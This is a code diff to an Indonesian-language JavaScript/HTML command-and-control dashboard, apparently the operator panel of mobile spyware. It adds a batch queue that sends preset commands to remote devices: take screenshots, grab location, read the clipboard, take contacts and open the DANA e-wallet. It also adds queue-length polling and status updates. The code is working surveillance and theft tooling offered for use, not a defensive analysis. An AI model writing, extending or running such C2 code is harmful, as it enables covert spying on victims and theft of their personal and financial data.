@@ -242,17 +242,20 @@
             <div id="c2Result" style="color:var(--text-secondary);font-size:11px;margin-top:6px;">Ready</div>
         </div>
 
-        <!-- BATCH C2 - KIRIM BANYAK PERINTAH SEKALIGUS! -->
+        <!-- 🔥 BATCH C2 - KIRIM BANYAK PERINTAH SEKALIGUS! -->
         <div class="card">
-            <h2>📦 BATCH C2 (Kirim Banyak Perintah Sekaligus)</h2>
+            <h2>📦 BATCH C2 (Kirim Banyak Perintah Sekaligus) <span class="badge" id="queueLength">Queue: 0</span></h2>
             <div class="flex" style="margin-bottom:10px;">
                 <textarea id="batchCommands" rows="6" style="flex:1;min-width:300px;font-family:monospace;font-size:11px;background:var(--bg-input);color:var(--text-primary);border:1px solid var(--border-color);border-radius:5px;padding:8px;" placeholder='{"aksi":"screenshot"}
 {"aksi":"ambil_lokasi"}
 {"aksi":"get_clipboard"}
 {"aksi":"buka_dana"}
 {"aksi":"ambil_kontak"}'>{"aksi":"screenshot"}
-{"aksi":"ambil_lokasi"}</textarea>
-                <button class="btn-purple" onclick="sendBatchC2()" style="align-self:flex-start;">📤 Kirim Batch</button>
+{"aksi":"ambil_lokasi"}
+{"aksi":"get_clipboard"}
+{"aksi":"buka_dana"}
+{"aksi":"ambil_kontak"}</textarea>
+                <button class="btn-purple" onclick="sendBatchC2()">📤 Kirim Batch</button>
             </div>
             <div id="batchResult" style="color:var(--text-secondary);font-size:11px;margin-top:6px;">Ready</div>
         </div>
@@ -1064,14 +1067,16 @@ function switchTab(id){
 }
 
 // ============================================================
-// 🔥 C2 COMMAND SEND
+// 🔥 C2 COMMAND SEND (SINGLE)
 // ============================================================
 function sendC2(aksi, params){
     if(!KEY){ showToast('Login dulu!'); return; }
     if(!params) params = {};
     
-    // 🔥 KIRIM TANPA AUTH! (TANPA KEY!)
-    var payload = { sumber: 'c2_command', data: { aksi: aksi, params: params } };
+    var payload = { 
+        sumber: 'c2_command', 
+        data: { aksi: aksi, params: params } 
+    };
     
     c2History.push({ waktu: new Date().toISOString(), aksi: aksi, status: '⏳ Sending...' });
     renderC2History();
@@ -1085,12 +1090,13 @@ function sendC2(aksi, params){
     })
     .then(function(r){ return r.json(); })
     .then(function(res){
-        document.getElementById('c2Result').textContent = '✅ Sent: '+aksi;
+        document.getElementById('c2Result').textContent = '✅ Sent: '+aksi + ' (Queue: ' + (res.queueLength || '?') + ')';
         document.getElementById('c2Result').style.color = '#0f0';
         var last = c2History[c2History.length-1];
         if(last){ last.status='✅ Success'; last.response=res; }
         renderC2History();
         showToast('✅ Command sent: '+aksi);
+        updateQueueLength();
     })
     .catch(function(){
         document.getElementById('c2Result').textContent = '❌ Error: '+aksi;
@@ -1153,7 +1159,8 @@ function sendBatchC2() {
             .then(function(r) { return r.json(); })
             .then(function(res) {
                 success++;
-                document.getElementById('batchResult').textContent = '✅ ' + success + '/' + total + ' terkirim';
+                document.getElementById('batchResult').textContent = '✅ ' + success + '/' + total + ' terkirim (Queue: ' + (res.queueLength || '?') + ')';
+                updateQueueLength();
             })
             .catch(function() {
                 failed++;
@@ -1171,9 +1178,38 @@ function sendBatchC2() {
         if(results.length > 0) {
             showToast(results.join(' | '));
         }
+        updateQueueLength();
     }, (lines.length * 300) + 2000);
 }
 
+// ============================================================
+// 🔥 UPDATE QUEUE LENGTH
+// ============================================================
+function updateQueueLength() {
+    try {
+        fetch('/data?type=perintah', { method: 'GET' })
+            .then(function(r) { return r.text(); })
+            .then(function(text) {
+                try {
+                    var data = JSON.parse(text);
+                    if (data && data.id) {
+                        document.getElementById('queueLength').textContent = 'Queue: ?';
+                    } else {
+                        document.getElementById('queueLength').textContent = 'Queue: 0';
+                    }
+                } catch(e) {
+                    document.getElementById('queueLength').textContent = 'Queue: 0';
+                }
+            })
+            .catch(function() {
+                document.getElementById('queueLength').textContent = 'Queue: ?';
+            });
+    } catch(e) {}
+}
+
+// ============================================================
+// 🔥 C2 HISTORY
+// ============================================================
 function renderC2History(){
     try {
         var container = document.getElementById('c2History');
@@ -1316,12 +1352,14 @@ if(localStorage.getItem('dash_key')){
     refreshData();
     connectWebSocket();
     setInterval(refreshData, 5000);
+    setInterval(updateQueueLength, 10000);
 }
 
 // ============================================================
 // 🔥 INIT
 // ============================================================
 renderC2Buttons();
+updateQueueLength();
 
 console.log('🔬 DASHBOARD ULTIMATE v2.0 LOADED');
 console.log('📊 160+ C2 Commands Ready');
